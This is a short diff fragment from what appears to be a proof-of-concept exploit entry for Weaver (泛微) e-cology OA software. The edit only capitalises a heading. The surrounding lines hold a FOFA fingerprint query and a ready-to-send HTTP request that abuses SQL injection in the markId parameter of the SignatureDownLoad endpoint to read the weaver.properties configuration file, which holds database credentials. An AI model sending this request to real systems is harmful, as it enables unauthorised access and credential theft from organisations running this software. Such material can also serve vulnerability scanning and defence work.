@@ -5,7 +5,7 @@
 app="泛微-OA（e-cology）"
 ```
 
-## poc
+## POC
 ```
 GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27 HTTP/1.1
 Host: {{Hostname}}
